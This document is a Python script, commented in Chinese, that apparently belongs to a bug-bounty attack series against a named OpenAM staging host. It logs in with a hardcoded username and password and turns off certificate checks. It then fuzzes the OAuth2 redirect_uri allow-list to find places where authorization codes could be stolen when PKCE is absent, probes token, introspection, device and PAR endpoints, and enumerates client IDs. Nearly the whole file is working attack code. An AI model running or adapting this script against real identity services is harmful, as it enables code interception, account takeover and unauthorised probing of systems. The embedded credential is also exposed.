# -*- coding: utf-8 -*-
"""AIC 第二十四轮:PKCE 缺失利用链——redirect_uri 白名单 fuzz + OAuth2 全接口面
1. 修复 code 过期测试(Content-Type)
2. redirect_uri 白名单 fuzz(302=合法,400=非法)——找可窃取 code 的端点
3. OAuth2 其他接口:userinfo/introspect/revoke/jwks/device/PAR
4. client_id 枚举(找其他客户端)
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
print('LOGIN OK')

from urllib.parse import quote

print('\n=== 1. code 过期测试(修 Content-Type) ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=openid&state=t' % quote(RU, safe='')
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
code = r.headers.get('Location', '').split('code=')[1].split('&')[0]
print('code:', code[:40])
for wait in [0, 60, 120]:
    time.sleep(wait)
    r2 = requests.post(BASE + '/am/oauth2/realms/alpha/access_token',
                       data={'grant_type': 'authorization_code', 'code': code,
                             'redirect_uri': RU, 'client_id': 'endUserUIClient'},
                       headers={'Content-Type': 'application/x-www-form-urlencoded'},
                       timeout=12, verify=False)
    print('after %ds: %d %s' % (wait, r2.status_code, r2.text[:120].replace('\n', ' ')))

print('\n=== 2. redirect_uri 白名单 fuzz ===')
candidates = [
    '/enduser/sessionCheck.html', '/enduser/sessionCheck', '/enduser/', '/enduser/index.html',
    '/enduser/callback.html', '/enduser/callback', '/enduser/redirect.html', '/enduser/redirect',
    '/enduser/oidc/callback', '/enduser/oidc/callback.html', '/enduser/accessdenied.html',
    '/enduser/login.html', '/enduser/logout.html', '/enduser/error.html', '/enduser/selfservice.html',
    '/enduser/#/dashboard', '/enduser/dashboard.html', '/enduser/silent.html', '/enduser/silentCheck.html',
    '/am/oauth2/realms/alpha/callback', '/am/oauth2/realms/alpha/redirect',
    '/enduser/forgotPassword.html', '/enduser/registration.html',
    '/enduser/js/sessionCheckFrame.js', '/enduser/sessionCheckFrame.js',
    '/enduser/app.html', '/enduser/main.html', '/enduser/home.html',
]
valid = []
for path in candidates:
    full = 'https://openam-bug-bounty-stag.forgeblocks.com' + path
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=openid&state=t' % quote(full, safe='')
    try:
        r = S.get(BASE + p, timeout=12, verify=False, allow_redirects=False)
        if r.status_code == 302:
            loc = r.headers.get('Location', '')
            has_code = 'code=' in loc
            print('VALID  %-45s -> %d code=%s' % (path, r.status_code, has_code))
            valid.append((path, loc))
        else:
            print('reject %-45s -> %d' % (path, r.status_code))
    except Exception as e:
        print('ERR    %-45s -> %s' % (path, str(e)[:50]))
    time.sleep(0.3)

print('\n=== 3. OAuth2 其他接口 ===')
O = BASE + '/am/oauth2/realms/alpha'
# 先用无 PKCE 拿个 token
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=%s&state=t' % (
    quote(RU, safe=''), quote('openid fr:iga:*', safe=''))
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
code = r.headers.get('Location', '').split('code=')[1].split('&')[0]
r2 = requests.post(O + '/access_token',
                   data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                         'client_id': 'endUserUIClient'},
                   headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=12, verify=False)
tok = r2.json().get('access_token', '')
print('token:', tok[:40])

# userinfo(带 token)
r = S.get(O + '/userinfo', headers={'Authorization': 'Bearer ' + tok}, timeout=12, verify=False)
print('userinfo(带token):', r.status_code, r.text[:200].replace('\n', ' '))
# userinfo 不带 token
r = S.get(O + '/userinfo', timeout=12, verify=False)
print('userinfo(无token):', r.status_code, r.text[:120].replace('\n', ' '))
# userinfo 用假 token
r = S.get(O + '/userinfo', headers={'Authorization': 'Bearer fake'}, timeout=12, verify=False)
print('userinfo(假token):', r.status_code, r.text[:120].replace('\n', ' '))
# introspect(无 client 认证)
r = S.post(O + '/introspect', data={'token': tok}, timeout=12, verify=False)
print('introspect:', r.status_code, r.text[:200].replace('\n', ' '))
# introspect 带 client 认证
r = S.post(O + '/introspect', data={'token': tok, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
print('introspect+client:', r.status_code, r.text[:200].replace('\n', ' '))
# revoke
r = S.post(O + '/token/revoke', data={'token': tok, 'client_id': 'endUserUIClient'}, timeout=12, verify=False)
print('revoke:', r.status_code, r.text[:150].replace('\n', ' '))
# jwks
r = S.get(O + '/connect/jwk_uri', timeout=12, verify=False)
print('jwks:', r.status_code, r.text[:150].replace('\n', ' '))
# device code flow
r = S.post(O + '/device/code', data={'client_id': 'endUserUIClient', 'scope': 'openid'}, timeout=12, verify=False)
print('device/code:', r.status_code, r.text[:150].replace('\n', ' '))
# PAR 端点
r = S.post(O + '/par', data={'client_id': 'endUserUIClient', 'response_type': 'code', 'redirect_uri': RU},
           timeout=12, verify=False)
print('par:', r.status_code, r.text[:150].replace('\n', ' '))
# tokeninfo(旧端点)
r = S.post(O + '/tokeninfo', data={'access_token': tok}, timeout=12, verify=False)
print('tokeninfo:', r.status_code, r.text[:150].replace('\n', ' '))

print('\n=== 4. client_id 枚举 ===')
for cid in ['endUserUIClient', 'admin', 'ig-client', 'igClient', 'oidcClient', 'client', 'postman',
            'endUserClient', 'loginClient', 'oauth2Client', 'serviceAccountClient', 'igaClient',
            'platformClient', 'enduser', 'enduserui', 'EndUserUIClient', 'idmClient', 'authClient',
            'apiClient', 'openamClient', 'amClient']:
    p = '/am/oauth2/realms/alpha/authorize?client_id=%s&response_type=code&redirect_uri=%s&scope=openid&state=t' % (
        cid, quote(RU, safe=''))
    try:
        r = S.get(BASE + p, timeout=12, verify=False, allow_redirects=False)
        tag = 'VALID' if r.status_code == 302 else 'reject'
        print('%-22s -> %d %s %s' % (cid, r.status_code, tag, r.headers.get('Location', '')[:80]))
    except Exception as e:
        print('%-22s -> ERR %s' % (cid, str(e)[:50]))
    time.sleep(0.3)
